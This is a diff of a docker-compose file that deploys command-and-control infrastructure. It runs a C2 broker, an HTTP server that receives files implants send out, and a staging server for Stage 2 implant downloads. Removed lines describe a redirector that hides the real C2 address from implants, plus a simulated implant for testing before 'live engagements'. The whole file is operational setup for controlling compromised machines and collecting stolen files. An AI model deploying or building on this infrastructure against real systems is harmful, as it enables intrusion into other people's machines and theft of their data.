@@ -1,110 +1,37 @@
 version: "3.9"
 
-# ─────────────────────────────────────────────────────────────────────────────
-# C2 Infrastructure — single command:  docker compose up
-#
-# Services:
-#   redirector      nginx TCP proxy (port 9999 external → c2-server internal)
-#   c2-server       C2 broker (operator API on 127.0.0.1:9998 — localhost only)
-#   exfil-server    HTTP file receiver on port 9090
-#   staging-server  Serves Stage 2 files over HTTP on port 8080
-#
-# Set OPERATOR_TOKEN before starting. Default is "changeme" — CHANGE IT.
-#   export OPERATOR_TOKEN=mysecrettoken
-#   docker compose up --build
-# ─────────────────────────────────────────────────────────────────────────────
-
-x-token: &token ${OPERATOR_TOKEN:-changeme}
-
 services:
 
-  # ── Redirector (nginx TCP proxy) ─────────────────────────────────────────────
-  # Implants connect to <your-LAN-ip>:9999 → proxied to c2-server:9999.
-  # Real C2 IP is never in the implant binary.
-  redirector:
-    image: nginx:1.25-alpine
-    container_name: redirector
-    volumes:
-      - ./nginx.conf:/etc/nginx/nginx.conf:ro
-    ports:
-      - "9999:9999"         # reachable on your LAN — implants call home here
-    depends_on:
-      - c2-server
-    networks:
-      - c2net
-    restart: unless-stopped
-
-  # ── C2 Server ─────────────────────────────────────────────────────────────────
   c2-server:
     build: .
     container_name: c2-server
     command: python c2_server.py
     environment:
-      OPERATOR_TOKEN: *token
+      OPERATOR_TOKEN: ${OPERATOR_TOKEN:-changeme}
       C2_LOG: /app/logs/c2.log
     ports:
-      - "127.0.0.1:9998:9998"   # operator port — localhost only, NOT on LAN
+      - "9999:9999"
+      - "127.0.0.1:9998:9998"
     volumes:
-      - ./logs:/app/logs         # c2.log appears in ./logs/ on your host
-    networks:
-      - c2net
+      - ./logs:/app/logs
     restart: unless-stopped
 
-  # ── Exfil Server ──────────────────────────────────────────────────────────────
   exfil-server:
     build: .
     container_name: exfil-server
     command: python exfil_server.py
     ports:
-      - "9090:9090"             # implants POST files here via EXFIL_FILE command
+      - "9090:9090"
     volumes:
-      - ./exfil:/app/exfil      # received files land in ./exfil/ on your host
-    networks:
-      - c2net
+      - ./exfil:/app/exfil
     restart: unless-stopped
 
-  # ── Staging Server ────────────────────────────────────────────────────────────
-  # stager.sh downloads helper.py + implant_client.py from here.
   staging-server:
     image: python:3.11-slim
     container_name: staging-server
     working_dir: /app
     volumes:
-      - .:/app:ro               # read-only — serves files in this directory
+      - .:/app:ro
     command: python -m http.server 8080
     ports:
       - "8080:8080"
-    networks:
-      - c2net
-
-  # ── Simulated Implant ─────────────────────────────────────────────────────────
-  # Uncomment to test the full chain locally without a real target.
-  # Comment back out (or remove) for live engagements.
-  #
-  # implant-sim:
-  #   build: .
-  #   container_name: implant-sim
-  #   command: python implant_client.py
-  #   environment:
-  #     C2_HOST:    redirector
-  #     C2_PORT:    "9999"
-  #     EXFIL_HOST: exfil-server
-  #     EXFIL_PORT: "9090"
-  #   depends_on:
-  #     - redirector
-  #     - exfil-server
-  #   networks:
-  #     - c2net
-
-networks:
-  c2net:
-    driver: bridge
-
-volumes:
-  # Ensures ./logs exists before the c2-server tries to write to it
-  logs:
-    driver: local
-    driver_opts:
-      type: none
-      o: bind
-      device: ${PWD}/logs
